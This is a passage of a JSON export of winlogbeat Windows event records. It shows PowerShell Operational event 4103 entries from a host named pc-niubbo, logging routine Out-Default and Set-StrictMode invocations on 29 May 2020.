                    "UserData": "None"
                },
                "time_created": "2020-05-29T20:23:26.386730"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-PowerShell/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "{4811673b-35f3-0000-5bd0-1148f335d601}",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "4103",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "3724275",
                    "Execution": {
                        "@ProcessID": "6076",
                        "@ThreadID": "10736"
                    },
                    "Keywords": "0x0000000000000000",
                    "Level": "4",
                    "Opcode": "20",
                    "Provider": {
                        "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                        "@Name": "Microsoft-Windows-PowerShell"
                    },
                    "Security": {
                        "@UserID": "S-1-5-21-4233494930-2381004282-3948590939-1001"
                    },
                    "Task": "106",
                    "Version": "1"
                },
                "event_data": {
                    "ContextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.752\n        Host ID = ec1f9bd3-9cb9-407b-b281-94864946226a\n        Host Application = powershell\n        Engine Version = 5.1.18362.752\n        Runspace ID = db7beb30-ad42-4fe8-ad7a-b2a5524f5bb4\n        Pipeline ID = 1392\n        Command Name = \n        Command Type = Script\n        Script Name = \n        Command Path = \n        Sequence Number = 54\n        User = PC-NIUBBO\\Niubbo\n        Connected User = \n        Shell ID = Microsoft.PowerShell",
                    "Payload": "CommandInvocation(Out-Default): \"Out-Default\"",
                    "UserData": "None"
                },
                "time_created": "2020-05-29T20:23:28.875158"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-PowerShell/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "{4811673b-35f3-0001-38cf-1148f335d601}",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "4103",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "3724276",
                    "Execution": {
                        "@ProcessID": "6076",
                        "@ThreadID": "10736"
                    },
                    "Keywords": "0x0000000000000000",
                    "Level": "4",
                    "Opcode": "20",
                    "Provider": {
                        "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                        "@Name": "Microsoft-Windows-PowerShell"
                    },
                    "Security": {
                        "@UserID": "S-1-5-21-4233494930-2381004282-3948590939-1001"
                    },
                    "Task": "106",
                    "Version": "1"
                },
                "event_data": {
                    "ContextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.752\n        Host ID = ec1f9bd3-9cb9-407b-b281-94864946226a\n        Host Application = powershell\n        Engine Version = 5.1.18362.752\n        Runspace ID = db7beb30-ad42-4fe8-ad7a-b2a5524f5bb4\n        Pipeline ID = 1395\n        Command Name = Set-StrictMode\n        Command Type = Cmdlet\n        Script Name = C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadLine.psm1\n        Command Path = \n        Sequence Number = 56\n        User = PC-NIUBBO\\Niubbo\n        Connected User = \n        Shell ID = Microsoft.PowerShell",
                    "Payload": "CommandInvocation(Set-StrictMode): \"Set-StrictMode\"\nParameterBinding(Set-StrictMode): name=\"Off\"; value=\"True\"",
                    "UserData": "None"
                },
                "time_created": "2020-05-29T20:24:55.860037"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-PowerShell/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "{4811673b-35f3-0001-4acf-1148f335d601}",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "4103",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "3724277",
                    "Execution": {
                        "@ProcessID": "6076",
                        "@ThreadID": "10736"
                    },
                    "Keywords": "0x0000000000000000",
                    "Level": "4",
                    "Opcode": "20",
                    "Provider": {
                        "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                        "@Name": "Microsoft-Windows-PowerShell"
                    },
                    "Security": {
                        "@UserID": "S-1-5-21-4233494930-2381004282-3948590939-1001"
                    },
                    "Task": "106",
                    "Version": "1"
                },
                "event_data": {
                    "ContextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.752\n        Host ID = ec1f9bd3-9cb9-407b-b281-94864946226a\n        Host Application = powershell\n        Engine Version = 5.1.18362.752\n        Runspace ID = db7beb30-ad42-4fe8-ad7a-b2a5524f5bb4\n        Pipeline ID = 1396\n        Command Name = \n        Command Type = Script\n        Script Name = \n        Command Path = \n        Sequence Number = 58\n        User = PC-NIUBBO\\Niubbo\n        Connected User = \n        Shell ID = Microsoft.PowerShell",
                    "Payload": "CommandInvocation(Out-Default): \"Out-Default\"\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"System.Collections.Hashtable\"",
                    "UserData": "None"
                },
                "time_created": "2020-05-29T20:24:58.728376"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-PowerShell/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "{4811673b-35f3-0000-e9d1-1148f335d601}",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "4103",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "3724278",
                    "Execution": {
                        "@ProcessID": "6076",
                        "@ThreadID": "10736"
                    },
                    "Keywords": "0x0000000000000000",
                    "Level": "4",
                    "Opcode": "20",
                    "Provider": {
                        "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                        "@Name": "Microsoft-Windows-PowerShell"
                    },
                    "Security": {
                        "@UserID": "S-1-5-21-4233494930-2381004282-3948590939-1001"
                    },
                    "Task": "106",
                    "Version": "1"
                },
                "event_data": {
                    "ContextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.752\n        Host ID = ec1f9bd3-9cb9-407b-b281-94864946226a\n        Host Application = powershell\n        Engine Version = 5.1.18362.752\n        Runspace ID = db7beb30-ad42-4fe8-ad7a-b2a5524f5bb4\n        Pipeline ID = 1398\n        Command Name = Set-StrictMode\n        Command Type = Cmdlet\n        Script Name = C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadLine.psm1\n        Command Path = \n        Sequence Number = 60\n        User = PC-NIUBBO\\Niubbo\n        Connected User = \n        Shell ID = Microsoft.PowerShell",
                    "Payload": "CommandInvocation(Set-StrictMode): \"Set-StrictMode\"\nParameterBinding(Set-StrictMode): name=\"Off\"; value=\"True\"",
                    "UserData": "None"
                },
                "time_created": "2020-05-29T20:24:58.733248"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-PowerShell/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "{4811673b-35f3-0001-72cf-1148f335d601}",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "4103",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "3724279",
                    "Execution": {
                        "@ProcessID": "6076",
                        "@ThreadID": "10736"
                    },
                    "Keywords": "0x0000000000000000",
                    "Level": "4",
                    "Opcode": "20",
                    "Provider": {
                        "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                        "@Name": "Microsoft-Windows-PowerShell"
                    },
                    "Security": {
                        "@UserID": "S-1-5-21-4233494930-2381004282-3948590939-1001"
                    },
                    "Task": "106",
                    "Version": "1"
                },
                "event_data": {
                    "ContextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.752\n        Host ID = ec1f9bd3-9cb9-407b-b281-94864946226a\n        Host Application = powershell\n        Engine Version = 5.1.18362.752\n        Runspace ID = db7beb30-ad42-4fe8-ad7a-b2a5524f5bb4\n        Pipeline ID = 1399\n        Command Name = \n        Command Type = Script\n        Script Name = \n        Command Path = \n        Sequence Number = 62\n        User = PC-NIUBBO\\Niubbo\n        Connected User = \n        Shell ID = Microsoft.PowerShell",
                    "Payload": "CommandInvocation(Out-Default): \"Out-Default\"\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"System.Collections.Hashtable\"",
                    "UserData": "None"
                },
                "time_created": "2020-05-29T20:25:04.050802"
            }
        },
        "_type": "_doc"
    },
